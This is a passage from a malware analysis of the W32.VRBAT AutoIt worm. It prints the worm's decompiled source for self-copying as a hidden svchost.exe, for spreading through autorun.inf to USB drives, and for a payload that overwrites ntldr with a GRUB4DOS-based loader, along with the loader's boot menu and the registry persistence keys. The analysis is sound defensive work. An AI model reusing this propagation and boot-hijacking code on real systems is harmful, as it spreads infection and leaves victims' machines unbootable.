&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileCopy.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileCopy</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptFullPath</span></span></a><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@TempDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“\svchost<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span>В”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Run.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Run</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@TempDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“\svchost<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span> В“ <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$PARAM</span><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@TempDir</span></span></a><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@SW_HIDE</span></span></a><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
&nbsp;</div>
<p><em>Figure 1: W32.VRBAT script.</em></p>
 
<p>When executed from a folder other than %windir% or %temp% the malware tries to copy itself to the %windir% folder using the name svchost.exe. If the user is not an administrator, it copies itself to the userВ’s temporary folder, with the same name. In both cases it executes the copied file afterwards. When executed from %temp%, if the user is not an administrator it just continues to infect removable devices using the CICLE1() function. If the user is an administrator it copies itself to the %windir% folder. Thus the malware might be В‘dormantВ’ for a long time waiting for the user to gain administrator rights. The malware uses the registry value Sound_filter in the key HEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run to start itself when there are no administrator rights. This value is deleted once administrator rights are gained.</p>
<div class="autoit" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Func</span></a> CICLE1<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">While</span></a> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">For</span></a> <span style="font-weight: bold; color: #AA0000;">$I</span> <span style="color: #FF0000; font-weight: bold;">=</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">67</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">To</span></a> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">90</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Chr.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Chr</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#41;</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“:\В”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Not</span></a> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/DriveGetType.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">DriveGetType</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span><span style="color: black;">&#41;</span> <span style="color: #FF0000; font-weight: bold;">=</span> В“RemovableВ”<span style="color: black;">&#41;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">ContinueLoop</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileExists.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileExists</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“autorun<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">inf</span>В”<span style="color: black;">&#41;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileSetAttrib.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileSetAttrib</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“autorun<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">inf</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> В“<span style="color: #FF0000; font-weight: bold;">-</span>RSHВ”<span style="color: #FF0000; font-weight: bold;">,</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileDelete.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileDelete</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“autorun<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">inf</span>В”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/DirRemove.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">DirRemove</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“autorun<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">inf</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileInstall.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileInstall</span></a><span style="color: black;">&#40;</span>В“AВ”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“autorun<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">inf</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileSetAttrib.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileSetAttrib</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“autorun<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">inf</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> В“<span style="color: #FF0000; font-weight: bold;">+</span>RSHВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileCopy.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileCopy</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptFullPath</span></span></a><span style="color: #FF0000; font-weight: bold;">,</span> <span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“USBCheck<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileSetAttrib.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileSetAttrib</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“USBCheck<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> В“<span style="color: #FF0000; font-weight: bold;">+</span>RSHВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Next</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Sleep.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Sleep</span></a><span style="color: black;">&#40;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">10000</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">WEnd</span></a><br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndFunc</span></a><br/>
&nbsp;</div>
<p><em>Figure 2: The infecting function.</em></p>
<p>If the malware is executed from %windir% it modifies the shell value of the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon key in order to execute every time a session is started. Then interesting things start happening. First, there is a time delay. The malware will not execute its payload on the same day as infection. Second, it will wait until the computer has initiated at least six sessions before executing its payload. This delay may confuse automatic processing tools, as well as users who are unable to correlate the damage caused with events that could have happened several days previously. The delay is achieved by storing a string value, t, in the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1 with the infection date and a counter that is incremented until it reaches six. Finally there is a В‘В–aВ’ parameter that was probably used for testing by the malware author.</p>
<p>When the computer has been rebooted six times, and the date is not the same as the date of infection, the malware executes its payload, the function INST() of the script (Figure 3). Until the payload time is reached, it continues to infect all removable devices every ten seconds, with or without administrative rights.</p>
<div class="autoit" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Func</span></a> INST<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Dim</span></a> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">2</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">0</span><span style="color: black;">&#93;</span> <span style="color: #FF0000; font-weight: bold;">=</span> В“В”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#93;</span> <span style="color: #FF0000; font-weight: bold;">=</span> В“В”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">For</span></a> <span style="font-weight: bold; color: #AA0000;">$I</span> <span style="color: #FF0000; font-weight: bold;">=</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">67</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">To</span></a> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">90</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Chr.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Chr</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#41;</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“:\В”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileExists.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileExists</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“ntldrВ”<span style="color: black;">&#41;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">0</span><span style="color: black;">&#93;</span> <span style="color: #FF0000; font-weight: bold;">=</span> В“ntldrВ”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileExists.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileExists</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“bootmgrВ”<span style="color: black;">&#41;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#93;</span> <span style="color: #FF0000; font-weight: bold;">=</span> В“bootmgrВ”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">For</span></a> <span style="font-weight: bold; color: #AA0000;">$I</span> <span style="color: #FF0000; font-weight: bold;">=</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">0</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">To</span></a> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#93;</span> <span style="color: #FF0000; font-weight: bold;">&lt;&gt;</span> В“В” <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileSetAttrib.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileSetAttrib</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#93;</span><span style="color: #FF0000; font-weight: bold;">,</span> В“<span style="color: #FF0000; font-weight: bold;">-</span>RSHВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileDelete.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileDelete</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileInstall.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileInstall</span></a><span style="color: black;">&#40;</span>В“LВ”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#93;</span><span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileSetAttrib.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileSetAttrib</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#93;</span><span style="color: #FF0000; font-weight: bold;">,</span> В“<span style="color: #FF0000; font-weight: bold;">+</span>RSHВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileInstall.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileInstall</span></a><span style="color: black;">&#40;</span>В“MВ”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“reco<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">bin</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileSetAttrib.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileSetAttrib</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“reco<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">bin</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> В“<span style="color: #FF0000; font-weight: bold;">+</span>RSHВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileInstall.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileInstall</span></a><span style="color: black;">&#40;</span>В“DВ”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“reco<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">sys</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileSetAttrib.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileSetAttrib</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$D</span> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“reco<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">sys</span>В”<span style="color: #FF0000; font-weight: bold;">,</span> В“<span style="color: #FF0000; font-weight: bold;">+</span>RSHВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$N</span><span style="color: black;">&#91;</span><span style="font-weight: bold; color: #AA0000;">$I</span><span style="color: black;">&#93;</span> <span style="color: #FF0000; font-weight: bold;">=</span> В“В”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Next</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Next</span></a><br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndFunc</span></a><br/>
&nbsp;</div>
<p><em>Figure 3: The payload function.</em></p>
<h2><a name="c2"></a>Payload</h2>
<p>The main malware activity is apparently simple: it creates the files reco.bin and reco.sys in the root of every volume containing the files ntldr or bootmgr. Then it overwrites the ntldr file, effectively preventing Windows from booting.</p>
<p>The new ntldr file is a functional boot loader based on Grub 0.97<sup><a href="#f1_3" name="b1_3">3</a></sup> which, together with the reco.bin file (Figure 4), ensures that the image contained in reco.sys will be executed on boot. Therefore, upon reboot, instead of Windows a different operating system will be used. The malware authors used the GRUB4DOS<sup><a href="#f1_4" name="b1_4">4</a></sup> gtldr file to create the loader, replacing all occurrences of menu.lst with reco.bin and removing references to GRUB4DOS by replacing them with spaces. Thus the released ntldr file is just a slightly modified version of the original gtldr GRUB4DOS file.</p>
 
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">timeout <span style="color: #000000;">0</span><br/>
default <span style="color: #000000;">0</span><br/>
title v<br/>
<span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #660033;">--set-root</span> <span style="color: #660033;">--ignore-fl</span> oppies <span style="color: #000000; font-weight: bold;">/</span>reco.sys<br/>
map <span style="color: #660033;">--mem</span> <span style="color: #000000; font-weight: bold;">/</span>reco.sys <span style="color: black;">&#40;</span>fd0<span style="color: black;">&#41;</span><br/>
map <span style="color: #660033;">--hook</span><br/>
chainloader <span style="color: black;">&#40;</span>fd0<span style="color: black;">&#41;</span>+<span style="color: #000000;">1</span><br/>
rootnoverify <span style="color: black;">&#40;</span>fd0<span style="color: black;">&#41;</span><br/>
map <span style="color: #660033;">--fl</span> <span style="color: #007800;">oppies</span>=<span style="color: #000000;">1</span><br/>
boot<br/>
&nbsp;</div>
<p><em>Figure 4: Content of reco.bin.</em></p>
